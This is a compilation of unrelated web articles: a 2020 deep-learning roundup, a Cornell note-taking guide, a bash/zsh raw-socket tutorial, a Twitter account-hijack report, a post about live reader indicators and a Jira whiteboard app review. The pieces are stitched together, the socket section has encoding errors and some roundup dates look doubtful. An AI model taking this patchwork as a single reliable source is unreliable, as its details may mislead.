<h2>Advances in Deep Learning 2020</h2>
<p><img src="https://www.artiba.org/Content/Images/advances-in-deep-learning.jpg" title=""></p>

<p>Keeping up with the trend of many recent years, Deep Learning in 2020 continued to be one of the fastest-growing fields, darting straight ahead into the Future of Work. The developments were manifold and on multiple fronts. Here’s a rundown on the prominent highlights.</p><h4>January 2020</h4><h5>OpenAI announced PyTorch as its standard Deep Learning framework</h5><p>OpenAI, the AI Research organization, declared <a target="_blank" href="https://www.artiba.org/blog/pytorch-3d-digging-deeper-in-deep-learning">PyTorch</a> as its new standard Deep Learning framework.  PyTorch will increase its research productivity at scale on GPUs. With PyTorch backing it, OpenAI cut down its generative modeling iteration time from weeks to days.</p><h4> March 2020</h4><h5>Megvii made its Deep Learning AI framework open-source</h5><p> Megvii Technology, a China-based startup, said that it would make its Deep Learning framework open-source. MegEngine is a part of Megvii’s proprietary AI platform Brain++. It can train computer vision on a broad scale and help developers the world over to build AI solutions for commercial and industrial use.</p><h5>Keras 2.4.0 was released</h5><p>The new release cleared confusion about incompatibilities and differences between tf.keras and the standalone Keras package. Now, a single Keras model – tf.keras – is operational.</p><h5>Huawei Technologies Co Ltd open-sourced ‘Mindspore’</h5><p>Huawei Technologies open-sourced MindSpore, a Deep Learning training framework for mobile, edge, and cloud scenarios. The framework is lightweight and is giving tough competition to TensorFlow and PyTorch.</p><p> It is scalable across devices and uses 20 percent fewer codes for functions like Natural Language Processing (NLP). It also supports parallel training, saves training time for different hardware, and maintains and preserves sensitive data.</p><p>MindSpore doesn’t process any data itself but ingests only the pre-processed model and gradient information, maintaining the robustness of the model.</p><h4> April 2020</h4><h5>IBM’s CogMol accelerated therapeutic developments for COVID-19</h5>       <p>IBM’s Deep Learning framework CogMol will help researchers to accelerate cures for infectious diseases like COVID-19. The new framework will address the challenges in the current “generative AI models to create novel peptides, proteins, drug candidates, and materials.”</p><h4> June 2020</h4><h5>ABBYY open-sourced NeoML, a framework for Deep Learning and algorithms</h5><p>ABBYY, announced the launch of NeoML. It is an open-source library for building, training, and deploying ML models. NeoML is a cross-platform framework. It is optimized for applications running in the cloud, on desktops, and on mobile devices, and supports both deep learning and <a target="_blank" href="https://www.artiba.org/blog/11-must-know-machine-learning-algorithms-for-ai-professionals">machine learning algorithms</a>.</p><p>Engineers at ABBYY use it for computer vision and NLP tasks. These include image preprocessing, classification, OCR, document layout analysis, and data extraction from documents, which can be structured or unstructured.</p><p>“NeoML offers 15-20% faster performance for pre-trained image processing models running on any device.” The library has been designed as a comprehensive tool to process and analyze multi-format data (video, image, etc).</p><h5>FINDER was published</h5><p>Network scientists were grappling with one important problem for years. They had been trying to identify key players or an optimal set of nodes that most influence a network's functionality.</p><p>In June this year, researchers at the National University of Defense Technology in China, University of California, Los Angeles (UCLA), and Harvard Medical School (HMS) published a deep reinforcement learning (DRL) framework called FINDER (Finding key players in Networks through Deep Reinforcement learning). It was trained on a small set of synthetic networks and then applied to real-world scenarios. The framework can identify key players in complex networks. It was published in a paper in Nature Machine Intelligence.</p><h4>  August 2020</h4><h5>scikit-learn released version 0.23</h5><p> The new release includes some new key features, and has fixed bugs in the previous one. Its major features include: generalized linear models, and Poisson loss for gradient boosting; a rich visual representation of estimators; scalability and stability improvements to KMeans; improvements to the histogram-based gradient boosting estimators; and sample-weight support for Lasso and ElasticNet.</p><h4>  September 2020</h4><h5>Amazon published Dive into Deep Learning</h5><p> Team Amazon added key programming frameworks to its book. The book – Dive into Deep Learning – is drafted through Jupyter notebooks and integrates mathematics, text, and runnable code. It is a fully open-source live document, with triggered updates to HTML, PDF, and notebook versions.</p><p> While the book was originally written for MXNeT, its authors also added PyTorch and TensorFlow to it.</p><p> Amazon’s book is a great open-source resource for students, developers, and scientists interested in Deep Learning.</p><h4>October 2020</h4><h5>A groundbreaking model was published in Nature Machine Intelligence</h5><p> This October, an international research team from TU Wien (Vienna), IST Austria, and MIT (USA) announced a new artificial intelligence system. Founded on the brains of tiny animals like threadworms, this new-age AI-system can control a vehicle with a few artificial neurons.</p><p> The solution offers remarkable benefits over previous Deep Learning models. Away from the infamous “black box”, it can handle noisy inputs and is simple to understand. The model was published in Nature Machine Intelligence.</p><h5>MIScnn was released</h5><p> MIScnn, an open-source Python framework for medical image segmentation with convolutional neural networks and Deep Learning, was announced.</p><p>It has intuitive APIs enabling the fast setup of medical image segmentation pipelines in just a few code lines. MIScnn also has data I/O, preprocessing; patch-wise analysis; data augmentation; metrics; a library with state-of-the-art deep learning models and model utilization; and automatic evaluation.</p><h5>TensorFlow 2.3 was released</h5><p>The new version comes with easy loading, faster preprocessing of data, and easier solving of input-pipeline bottlenecks. tf.data solves input pipeline bottlenecks and improves resource utilization. For advanced users, it has improved training speed. tf.data allows users to reuse the output on a different training run, which frees up additional CPU time.</p><p> The TF Profiler adds a memory profiler to visualize the model’s memory usage, and a Python tracer to trace Python function calls in the model. It also offers experimental support for the new Keras Preprocessing Layers API.</p><h5>PyTorch 1.7.0 was released</h5><p> It includes many new APIs including “support for NumPy-compatible FFT operations, profiling tools, and major updates to both distributed data parallel (DDP) and remote procedure call (RPC)-based distributed training.”</p><h5>November and Beyond</h5><p>As 2020 enters its last lap, we expect more new and impressive developments to crop up.</p><p>Mark Cuban said: “Artificial Intelligence, deep learning, machine learning — whatever you're doing if you don't understand it — learn it. Because otherwise you're going to be a dinosaur within 3 years.”</p><p>Cheers to diving deeper into Deep Learning!</p><p> Did we miss an important update? Share with us!</p>

    <p>There are dozens of ways to take notes, but they all seemingly end up with the same outcome: well-intentioned bullet points that quickly turn into vast swathes of difficult-to-memorise text, abbreviations that become uncrackable codes (even to those that made them in the first place), and mindless layouts with all the clarity of an inebriated housefly. If you frequently find your notes (be it from class, business meetings or online courses) in any way similar to the above then the Cornell Notes system is for you.</p>

<p>Created in the 1940s by Walter Pauk, a prominent education professor from (you guessed it) Cornell University, the Cornell Notes method was devised so you can make better notes, and study more effectively. Many people find the Cornell Note system to be a transformative approach to note-taking, and you could too. In this article we’ll tell you what Cornell Notes are, why they are so effective and how to take them.</p>
<h2>What are Cornell Notes?</h2>
<p>Cornell Notes are an uncomplicated, structured way of taking notes on any subject. We’ll go into more detail below but all you’ll need to get started is a decent sized pad of paper (A4 is preferable, and can be lined, grid-lined or blank), a pen (obviously), and three lines across &amp; down the page.</p>

<p>With Cornell Notes you can organise your notes on-the-go through class, rather than mindlessly scribbling all the information thrown in your direction as quickly as possible. The beauty of Cornell Notes lies in the layout, and by employing this technique you will find yourself making more sense of the class material as the lesson progresses, and a better understanding of the content when it’s time for review.</p>
<h2>Advantages and Use Cases of Cornell Notes</h2>
<div>
<div>
    <h3>It’s simple</h3>
    <p>This is Cornell Notes’s most prominent feature, and its biggest advantage too: it’s simple. It’s such a straightforward method to implement that you don’t need much to do it. No coloured tabs or reams of dividers or post-it notes, just pen and paper. It also means that once you’ve read this article you’ll be good to go, and bringing big gains to your note-taking skills in no time.</p>
</div>
<div>
    <h3>It’s flexible</h3>
    <p>There are an abundance of subject-matters out there - luckily, Cornell Notes work with every single one. They can be applied to any number of scenarios, including those outside of the learning environment. Whilst the majority of people will use Cornell Notes within the context of classroom learning and university lectures, it works equally well with online courses, client meetings, and even business planning.</p>
</div>
<div>
    <h3>You will retain information better</h3>
    <p>Cornell Notes break lessons down into manageable chunks that are easy to remember. In this way you can keep track of the salient bits of information that also come to be better understood on later review. Additionally, the Cornell layout is designed for easy testing of the information on the page which will further improve study-productivity.</p>
</div>
</div>
<h2>How to take Cornell notes?</h2>
<p>To begin with, divide your paper into a few sections, essentially an off-centre “I” like the following:</p>
<p>To save time, it can be good to come to class or your meeting with a bunch of sheets that already have the layout. The basis of the Cornell Notes format involves separating the page into four sections: a space at the top for some specific topic details, a right hand column containing the main pieces of content we need to know (also known as the “Response Column”), with a column on the left called the “Cue Column”, containing keywords and questions. Finally the bottom space is a summary of the information above it.</p>
<h3>1. Top Space - Subject Particulars</h3>
<p>The first thing you will want to do is fill in some details like the specific topic that these notes are on, and the topic/objective to be covered. This top space will contain information that will organise your notes later, so noting the date, lecture number and so on could prove useful later.</p>
<h3>2. Right Hand Column - Main Notes</h3>
<p>The large box on the right hand side is for noting down key words, concepts and facts. As you listen to the information you’re learning, note down the salient points in this column. Make sure you skip lines between ideas so there’s a clear separation between them on the page (and in your mind when you go back to revise). If you find an online lecture going too quickly, also think about skipping a couple of lines to leave yourself some space in case you need to go back and add things later.</p>
<h3>3. Left Hand Column - Cues</h3>
<p>So far, this all seems pretty similar to regular note-taking. However, it’s when we get to the left column the magic really happens. We now want to cue on the left things that relate to the information we've just written down. The cue can be a question, keyword or phrase that refers to the material on the right hand side. In some cases the lesson might move on before we have time to fill it in and that's fine. Just come back later and write the cues when there's a pause in the session.</p>
<p>Once this section is filled in, you will be left with two columns consisting of cues and responses, with those cues on the left encouraging us to think of the more detailed information on the right.</p>
<h3>4. Bottom Space: Summary</h3>
<p>The final section to fill is the bottom space. This is your summary, essentially a few sentences outlining the key points of the information above. Pull out key ideas from the cue and response columns, maybe any vocabulary you're unfamiliar with, and just generally all the important stuff that you’d want to know if you were going to explain this topic to somebody else.</p>
<p>It can be good to wait at least a couple of hours before doing the summary, so as to give time for the content to sink in and let your brain sort things out in the background.</p>
<h2>Subsequent Testing and Review</h2>
<p>And that’s it! The last step of the Cornell Notes process is when you come back to the notes for review and revision. You’ll see a clearly structured representation of the class and subject-area, and have a ready-made testing system in front of you: cover the right hand column and you’ll have questions or keyword prompts to answer and expand upon for a really productive revision session.</p>
<h2>Conclusion</h2>
<p>It almost sounds too simplistic to be effective, but it is in its simplicity that Cornell Notes work so well. This is a technique that not only helps you consolidate details of information better, but remember it too. Whilst Cornell Notes help you with taking notes in the moment, they help you when coming to revise those notes later, enhancing your study-time and improving your productivity.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<p>Something I learned recently and I thought was <em>amazing</em> - you can create sockets straight from your shell! Well, assuming you use bash or zsh - from some surface level digging, I couldnâ€™t find anything for fish.</p>

<p>Hereâ€™s how it works:</p>

<h2 id="bash">bash</h2>
<p>Bash supports tcp and udp connections out of the box, and does so with an imaginary device in <code>/dev</code>. Enter</p>
<div><div><pre><code><span>$ </span><span>echo</span> <span>"text!"</span> <span>&gt;</span> /dev/<span>$PROTO</span>/<span>$HOST</span>/<span>$PORT</span>
</code></pre></div></div>
<p>And youâ€™ll create a connection to <code>HOST:PORT</code>. <code>$PROTO</code> can be <code>tcp</code> or <code>udp</code>. If the connection canâ€™t be made, writing to/reading the file will fail.</p>

<p>Along with being easy to access from the terminal, itâ€™s <em>very</em> handy for scripts, especially if you donâ€™t have <code>nc</code>/<code>telnet</code>. For example, if a local build of a web app runs on port 8000, you can check if itâ€™s running with:<sup id="fnref:1" role="doc-noteref"><a href="#fn:1">1</a></sup></p>

<div><div><pre><code><span>#!/bin/bash</span>
<span>if </span><span>exec </span>3&gt;/dev/tcp/localhost/4000 <span>;</span> <span>then
	</span><span>echo</span> <span>"server up!"</span>
<span>else
	</span><span>echo</span> <span>"server down."</span>
<span>fi</span>
</code></pre></div></div>
<p>And then use that information somewhere else.</p>

<p>If youâ€™re unfamiliar, <code>exec</code> without any arguments is used to redirect file descriptors and files. By associating fd 3 with <code>/dev/tcp/localhost/4000</code>, it attempts to create a file there and thus a connection. We use <code>&gt;</code> to open the socket for writing, although we donâ€™t need to write anything in this case.</p>

<p>By using <code>&lt;&gt;</code> we can open a file for reading and writing, and use it to create a super simple curl:</p>
<div><div><pre><code><span>#!/bin/bash</span>
<span>exec </span>3&lt;<span>&gt;</span>/dev/tcp/<span>"</span><span>$1</span><span>"</span>/80
<span>echo</span> <span>-e</span> <span>"GET / HTTP/1.1</span><span>\n</span><span>"</span> <span>&gt;</span>&amp;3
<span>cat</span> &lt;&amp;3
</code></pre></div></div>
<div><div><pre><code>$ ./simplecurl www.google.com
HTTP/1.1 200 OK
Date: Thu, 03 Dec 2020 00:57:30 GMT
Expires: -1
....
&lt;google website&gt;
</code></pre></div></div>

<p>Iâ€™m sure you can see the power of being able to open sockets with bash alone. Go play around with it!</p>

<h2 id="zsh">zsh</h2>
<p>zsh has an external module you can load in order to use itâ€™s socket capabilities. It doesnâ€™t support udp like bash, but itâ€™s more powerful in a few ways!</p>

<p>To load the module, put the following in your <code>.zshrc</code> or run it in your shell:</p>


<p>We now have access to the zsh networking builtin - <code>ztcp</code>!</p>

<p><code>ztcp</code> allows creating connections, like bash, but also allows listening for connections.</p>

<p>Straight from the zsh docs, we can create a connection between two machines with <code>ztcp</code>:</p>

<div><div><pre><code><span># host machine:</span>
ztcp <span>-l</span> 7128
<span>lfd</span><span>=</span><span>$REPLY</span>
ztcp <span>-a</span> <span>$lfd</span>
<span>talkfd</span><span>=</span><span>$REPLY</span>

<span># client machine</span>
ztcp HOST 7128
<span>talkfd</span><span>=</span><span>$REPLY</span>
</code></pre></div></div>

<p>The <code>$REPLY</code> variable here is a file descriptor returned by the last <code>ztcp</code> command, referring to the socket/connection it just created.</p>

<p>So, <code>talkfd</code> on both machines is a file descriptor for talking to the other:</p>
<div><div><pre><code><span># host machine</span>
<span>echo</span> <span>-e</span> <span>"hello!"</span> <span>&gt;</span>&amp;<span>$talkfd</span>

<span># client machine</span>
<span>read</span> <span>-r</span> line &lt;&amp;<span>$talkfd</span><span>;</span> print <span>-r</span> - <span>$line</span>
<span>&gt;</span> hello!
</code></pre></div></div>

<p>Again, thereâ€™s a lot more you can do, especially with the ability to listen for connections.</p>

<p>Hope this was as interesting to you as it was to me!</p>

<p><strong>Status: 00:27 in the morning of December 4 my account was restored again.</strong> No words or explanations on how it happened.</p>



<p>This morning (December 3rd, 2020) I woke up to find myself logged out from my Twitter account on the devices where I was previously logged in. Due to “suspicious activity” on my account. I don’t know the exact time this happened. I checked my phone at around 07:30 and then it has obviously already happened. So at time time over night.</p>



<p>Trying to log back in, I get prompted saying I need to update my password first. Trying that, it wants to send a confirmation email to an email address that isn’t mine! Someone has managed to modify the email address associated with my account.</p>



<p>It has only been two weeks since someone <a href="https://daniel.haxx.se/blog/2020/11/16/i-lost-my-twitter-account/" data-type="post" data-id="15196">hijacked my account</a> the last time and abused it for scams. When I got the account back, I made very sure I both set a good, long, password and activated 2FA on my account. 2FA with auth-app, not SMS.</p>



<p>The last time I wasn’t really sure about how good my account security was. This time I know I did it by the book. And yet this is what happened.</p>



<div><figure><img loading="lazy" src="https://daniel.haxx.se/blog/wp-content/uploads/2020/12/Screenshot_2020-12-03-Losenordsaterstallning.png" alt="" width="467" height="328"><figcaption>Excuse the Swedish version, but it wasn’t my choice. Still, it shows the option to send the email confirmation to an email address that isn’t mine and I didn’t set it there.</figcaption></figure></div>



<h2>Communication</h2>



<p>I was in touch with someone at Twitter security and provided lots of details of my systems , software, IP address etc while they researched their end about what happened. I was totally transparent and gave them all info I had that could shed some light.</p>



<p>Nobody from Twitter has said anything or brought any explanation, blame or excuse as to how this happened or why.</p>



<h2>Was I breached?</h2>



<p>Many people have proposed that the attacker must have come through my local machine to pull this off. If someone did, it has been a very polished job as there is no trace at all of that left anywhere on my machine. Also, to reset my password I would imagine the attacker would need to somehow hijack my twitter session, need the 2FA or trigger a password reset and intercept the email. I don’t receive emails on my machine so the attacker would then have had to (also?) manage to get into my email machine and removed that email – and not too many others because I receive a lot of email and I’ve kept on receiving a lot of email during this period.</p>



<p>I’m not ruling it out. I’m just thinking it seems unlikely.</p>



<p>If the attacker would’ve breached my phone and installed something nefarious on that, it would not have removed any reset emails and it seems like a pretty touch challenge to hijack a “live” session from the Twitter client or get the 2FA code from the authenticator app. Not unthinkable either, just unlikely.</p>



<h2>Most likely?</h2>



<p>As I have no insights into the other end I cannot really say which way I think is the most likely that the perpetrator used for this attack, but I will maintain that I have no traces of a local attack or breach and I know of no malicious browser add-ons or twitter apps on my devices.</p>



<h2>Details</h2>



<p>Firefox version 83.0 on Debian Linux with Tweetdeck in a tab – a long-lived session started over a week ago (ie no recent 2FA codes used), </p>



<p>Browser extensions: Cisco Webex, Facebook container, multi-account containers, HTTPS Everywhere, test pilot and ublock origin.</p>



<p>I only use one “authorized app” with Twitter and that’s Tweetdeck.</p>



<p>On the Android phone, I run an updated Android with an auto-updated Twitter client. That session also started over a week ago. I used <em>Google Authenticator</em> for 2fa.</p>



<p>While this hijack took place I was asleep at home (I don’t know the exact time of it), on my WiFi, so all my most relevant machines would’ve been seen as originating from the same “NATed” IP address. This info was also relayed to Twitter security.</p>



<h2>Restored</h2>



<p>The actual restoration happens like this (and it was the exact same the last time): I just suddenly receive an email on how to reset my password for my account.</p>



<p>The email is a standard one without any specifics for this case. Just a template press the big button and it takes you to the Twitter site where I can set a new password for my account. There is nothing in the mail that indicates a human was involved in sending it. There is no text explaining what happened. Oh, right, the mail also include a bunch of standard security advice like “use a strong password”, “don’t share your password with others” and “activate two factor” etc as if I hadn’t done all that already…</p>



<p>It would be prudent of Twitter to explain how this happened, at least roughly and without revealing sensitive details. If it was my fault somehow, or if I just made it easier because of something in my end, I would really like to know so that I can do better in the future. But no.</p>



<h2>What was done to it?</h2>



<p>No tweets were sent. The name and profile picture remained intact. I’ve not seen any DMs sent or received from while the account was “kidnapped”. Given this, it seems possible that the attacker actually only managed to change the associated account email address.</p>

        <p>This has been the most fun I’ve had with JavaScript in some time. A spiritual successor to the <a href="https://underjord.io/live-server-push-without-js.html">stupid solution</a> which allowed both me and my visitors to see the number of concurrent readers. It is also a piece of whimsy I’ve wanted to do for a while to add more magic and life to the site. The animations default to off to preserve CPU but do turn on the magic switch in the top right if you can and want to see the visuals. This is arguably less stupid.</p>
<p>What is it? Well, a live number of my readership for the entire site for one. If you turn on the magic you should also see the rough positions of other readers on the site that are on the same page as a small hovering geometric shape. I call them wisps.</p>
<p>It’s not often that you can see the footfalls of other people on the web unless they write a comment or something. I don’t want to expose my readers to one another in any privacy-sensitive way or in any fashion that requires moderation. This simply gives a rough indication of activity on the site and whether people are reading the same thing as you. And it moves around in fun ways.</p>
<p>Anyway, I enjoy it and I hope you will too. So how is this done? A small backend in Phoenix using Channels (basically just WebSockets), a small amount of Javascript to render new elements and update positions based on the state updates from the backend. The idle hovering of the symbols is CSS Animation and moving from area to area as the reader reads on is done via CSS Transitions.</p>
<p>I was hoping to default to on, but as I’ve found out with my sweet animated gradient lines, CSS aninmation can get CPU intensive. Right now my gradient lines pause after a period of inactivity and only run if there is activity. They hit 12% or so on my CPU which is dumb. A better fix to make them more lightweight is on the way, the idle-handling is a mitigation. So for these I wanted to avoid a big performance hit. They perform okay right now from my tests, they use the cheap-to-animate transforms so there’s nothing too heavy. But also, there’s not a known upper bound on the potential number of wisps active at the same time and if that scales poorly on some browsers I don’t want to default to setting someone’s phone on fire.</p>
<p>The number is available regardless since that doesn’t animate. I think showing this sort of thing is a fair way of both measuring concurrent visitors and sharing that with the visitor. I can see it, you can see it. I’ve also been considering a 90’s web visitor counter that is actually live. Could be fun. Just gotta find the right aesthetic.</p>
<p>I like this way of extending my site. I guess in a JAMStack fashion. The site is static but I can build small interactive parts and back them with minimal backends which for stateful applications Elixir does exceedingly well. If these backends go down the site will still work. All the important stuff is there. The fun stuff degrades to a connection error in the console.</p>

<p><strong>Paid partnership with&nbsp;<a rel="noreferrer noopener" target="_blank" href="https://spartez-software.com/">Spartez Software</a></strong></p>



<p>Yep, you read that right. This week I am working with <a href="https://spartez-software.com/" target="_blank" rel="noreferrer noopener">Spartez</a> to review their new <a href="https://marketplace.atlassian.com/apps/1223211/whiteboards-for-jira-team-collaboration?hosting=cloud&amp;tab=overview" target="_blank" rel="noreferrer noopener">Whiteboards for Jira App</a>. And before you get worried – no, I have no intention of letting that change how I do reviews. I’ll go over the general idea of an app and give you some use cases. Then I’ll take a deeper dive into the feature set and end with my usual analysis – including how the App can be improved. And you can always find a way to enhance any App. I should note now, though, that the App is for Jira and Confluence Cloud only. But we’ll get to that in a bit.&nbsp;</p>



<p>Now, the world has had a crash course in working remotely. I had a bit of a head start, with me starting a remote job at the End of September ’19, versus most everyone’s February to March ’20. However, there is one thing that I’ve missed most. Sometimes it’s just easier to get someone into a meeting room with a markerboard and collaborate while drawing out the workflow, feature, automation, or what-have-you. There isn’t a good analog in the virtual space. A slack meeting comes close, but *not* quiet there, and both Zoom and Webex don’t even come close.</p>



<p>Fortunately, Spartez has been thinking the same thing. If you are not familiar with them, they are often known for Apps like Agile Poker and Agile Cards. To me, it seems they are always a go-to pick when you need to bridge the gap between the physical world and the digital one for your Agile practices. I’ve used both of the apps mentioned above before and have rarely had a problem with them.&nbsp;</p>



<p>However, they were facing a similar problem that most of us now face. How do we take some of the same practices we used to do in person together and take that online? One such challenge is Whiteboarding an idea out. And this was what Grzegorz Tańczyk was thinking about as he was preparing for Atlassian’s Codegeist 2020 hackathon.&nbsp;&nbsp;</p>



<p>This concept isn’t a new idea, however. There are several similar products already on the market, including Gliffy and Miro. However, the key to this is that it is Jira Cloud Native. This fact means it can import and change your issues already in Jira and create new content on your whiteboard.&nbsp;</p>



<p>When I saw the demo, I couldn’t help but think of all the potential use cases. There were the normal ones for sorting and updating issues. For example, you can set an “Update Issues” area to be a “Rank” Area and sort your issues there, and that new ranking will be updated on the Jira Issues. Or you can set an “Update Issues” Area to update the assignee so that any issues dragged there are assigned to that person.&nbsp;&nbsp;</p>

<p>However, the idea that captured me was the ability to add Images to it. Imagine this – you are on a UI/UX Team. You need some feedback on a new design change you are working on. So you set up a Webex/Zoom, so everyone can talk, and set up a Whiteboard with the new design on it. Then people can comment on various parts of it on the whiteboard – in real-time. And once a comment is settled on, you can directly convert those comments into Jira issues to be worked on.</p>



<figure><img data-attachment-id="2690" data-permalink="https://thejiraguy.com/image-5-16/" data-orig-file="https://thejiraguycom.files.wordpress.com/2020/12/image-5.png" data-orig-size="1583,800" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="image-5" data-image-description="" data-medium-file="https://thejiraguycom.files.wordpress.com/2020/12/image-5.png?w=300" data-large-file="https://thejiraguycom.files.wordpress.com/2020/12/image-5.png?w=1024" src="https://thejiraguycom.files.wordpress.com/2020/12/image-5.png?w=1024" alt="" srcset="https://thejiraguycom.files.wordpress.com/2020/12/image-5.png?w=1024 1024w, https://thejiraguycom.files.wordpress.com/2020/12/image-5.png?w=150 150w, https://thejiraguycom.files.wordpress.com/2020/12/image-5.png?w=300 300w, https://thejiraguycom.files.wordpress.com/2020/12/image-5.png?w=768 768w, https://thejiraguycom.files.wordpress.com/2020/12/image-5.png 1583w" sizes="(max-width: 1024px) 100vw, 1024px"><figcaption>nothing to see here…</figcaption></figure>



<p>That’s the thing, though; this lets you collaborate in real-time. During the product demo, I was invited onto the board. So imagine, here I am in the US; meanwhile, the two people giving the demo for Spartez are in Poland. However, on the call, I could see the edits I was making show up on their board in real-time. That fact alone was amazing. And I didn’t even have to sign up to their Jira instance and take up a license!&nbsp;</p>



<p>So, let’s drill down into some features and see what this App can do.</p>







<h2>Collaborate concurrently with all your team members</h2>



<p>I’ve already touched on this – but this is the whole point. An in-person whiteboard is fantastic for collaboration. And this App is one of the closest experiences I’ve seen to that experience. This App allows you and your teammates, stakeholders, or any interested party to get together and work on an idea or task quickly, all while being aware of what is in Jira.</p>



<h2>Easily populate the whiteboard with existing Jira issues or create new ones.</h2>



<p>This concept, I think, is where this App excels against its competitors. To my knowledge, no other integration allows you to inject your Jira issues directly to the board to be a part of the experience.&nbsp;&nbsp;</p>



<figure><img data-attachment-id="2681" data-permalink="https://thejiraguy.com/image-2-17/" data-orig-file="https://thejiraguycom.files.wordpress.com/2020/12/image-2.png" data-orig-size="1647,850" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="image-2" data-image-description="" data-medium-file="https://thejiraguycom.files.wordpress.com/2020/12/image-2.png?w=300" data-large-file="https://thejiraguycom.files.wordpress.com/2020/12/image-2.png?w=1024" src="https://thejiraguycom.files.wordpress.com/2020/12/image-2.png?w=1024" alt="" srcset="https://thejiraguycom.files.wordpress.com/2020/12/image-2.png?w=1024 1024w, https://thejiraguycom.files.wordpress.com/2020/12/image-2.png?w=150 150w, https://thejiraguycom.files.wordpress.com/2020/12/image-2.png?w=300 300w, https://thejiraguycom.files.wordpress.com/2020/12/image-2.png?w=768 768w, https://thejiraguycom.files.wordpress.com/2020/12/image-2.png 1647w" sizes="(max-width: 1024px) 100vw, 1024px"></figure>



<h2>Edit, update, rank, or transition Jira issues – individually, in a bulk, or via update zones.</h2>



<p>So, in the “before times,” one thing I liked about using whiteboards is it allowed you to organize information in a 2D space. Jira Agile Boards comes close, but they only allow you to manage along one axis.</p>



<p>Here, you are free to set up 2D “Zones” that affect your Jira issues. This ability means you can have one area of the board for your backlog, where you rank your issues, then another for planned work, where you have different “Buckets” to assign it to users, then a third to represent your Agile board. All of this is managed on the same screen, as intuitively as “drag-and-drop.”&nbsp;&nbsp;</p>



<div><figure><img data-attachment-id="2683" data-permalink="https://thejiraguy.com/image-4-16/" data-orig-file="https://thejiraguycom.files.wordpress.com/2020/12/image-4.png" data-orig-size="597,587" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="image-4" data-image-description="" data-medium-file="https://thejiraguycom.files.wordpress.com/2020/12/image-4.png?w=300" data-large-file="https://thejiraguycom.files.wordpress.com/2020/12/image-4.png?w=597" src="https://thejiraguycom.files.wordpress.com/2020/12/image-4.png?w=597" alt="" srcset="https://thejiraguycom.files.wordpress.com/2020/12/image-4.png 597w, https://thejiraguycom.files.wordpress.com/2020/12/image-4.png?w=150 150w, https://thejiraguycom.files.wordpress.com/2020/12/image-4.png?w=300 300w" sizes="(max-width: 597px) 100vw, 597px"></figure></div>



<p>You can also drag and select a group of issues, edit them in real-time, give you a refined “Bulk Edit” option, or edit issues individually. The team leaned in because this was connected to Jira and really worked to make sure these capabilities were up to snuff, and it shows. Well done!</p>



<h2>Control the access using Jira permissions.</h2>



<p>This. 100% This. I consider permissions to be essential for any app. Yeah, you might want to keep this open and let everyone use it. Or you might not. Or some mix there-in. The fact is, having permissions that can easily be set gives you that control, rather than the App Developer.</p>



<h2>View in real-time what other participants do.</h2>



<p>They do mean real-time. As I said, this point was the one where most of my concerns lay during the demo. However, Spartez was willing to demonstrate it, granting me limited access to their demo board. And there was a slight delay – but that’s only because Physics is a cruel mistress. But honestly, I had to&nbsp;<strong><em>really&nbsp;</em></strong>pay attention to even notice it – most users probably won’t ever see it.&nbsp;</p>



<h2>Use post-it cards, images, videos, or draw anything.</h2>



<p>Sure, this can be a useful feature. I stated a use case for this above. But this feature can be fun. Yes, the App does support animated gifs. I checked.&nbsp;&nbsp;</p>

<h2>What this App does Well</h2>



<p>Well, this App does what it sets out to do, which is enable collaboration by allowing users to work on a virtual Whiteboard. However, the ability to manipulate your Jira issues in real-time via the board is where this App shines. It’s intuitive, useful, and fun to use. And it’s not often I can say that in Jira.</p>



<h2>What this App could work on</h2>



<p>Well, the obvious needs to be stated here. Whiteboards for Jira is only available for Jira Cloud right now. I know for some of you out there, this is a deal breaker.  This situation is sufficient to start with, but I too would love to see this on a Jira Server or Data Center instance.&nbsp;&nbsp;</p>



<p>Another feature I’d love to see is an option to “Snap to grid.” You can always snap things to other nearby objects, but the first object is always free-hand. I’d love to see some way to add an option to snap it to a grid – because, you know, some of us are perfectionists.&nbsp;</p>



<h2>Would I recommend this App?</h2>



<p>First, given the current offering, I can only recommend this App if you are on Jira Cloud. I’m hoping that will change soon, but Cloud is the only place you can get it.&nbsp;&nbsp;</p>



<p>And honestly, this App is meant to solve a specific problem. Some teams prefer to use a whiteboard; some teams are fine using digital tools and don’t need it. So, if your one of the former teams who, in the “before-times,” would use a whiteboard, I say get it. Your Teams will likely thank you for it.&nbsp;&nbsp;</p>



<h2>Whiteboard for Jira’s Tier Rank</h2>



<p>This one was hard for me. If I go on functionality alone, It’s an easy A. However, the limited availability is an essential factor. I maintain a free tier Jira Cloud system for testing, but it’s not my daily driver. Given the whole package, I need to give it a B+, with upgrade potential to an A down the road.&nbsp;</p>

